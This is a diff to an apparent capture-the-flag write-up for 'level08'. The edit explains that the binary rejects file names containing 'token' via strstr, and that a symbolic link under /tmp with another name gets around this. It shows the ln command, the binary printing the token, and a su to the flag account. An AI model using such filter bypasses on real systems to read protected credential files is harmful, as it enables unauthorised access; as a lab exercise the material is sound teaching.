@@ -15,12 +15,13 @@ $ ./level08
 $ ./level08 token
 You may not access 'token'
 ```
-So we want the binary to read the file, so we create a symbolic link that will enable this:
+When examining the binary, we see it uses strstr to make sure the name of the file doesn't contain the word 'token'. \
+So we want the binary to read the file with another name, so we create a symbolic link which doesnt contain 'token' in its name:
 ```shell
-$ ln -sfv $PWD/token /tmp/readtoken
-`/tmp/readtoken' -> `/home/user/level08/token'
+$ ln -sfv $PWD/token /tmp/whatever
+`/tmp/whatever' -> `/home/user/level08/token'
 
-$ ./level08 /tmp/readtoken
+$ ./level08 /tmp/whatever
 quif5eloekouj29ke0vouxean
 
 $ su flag08
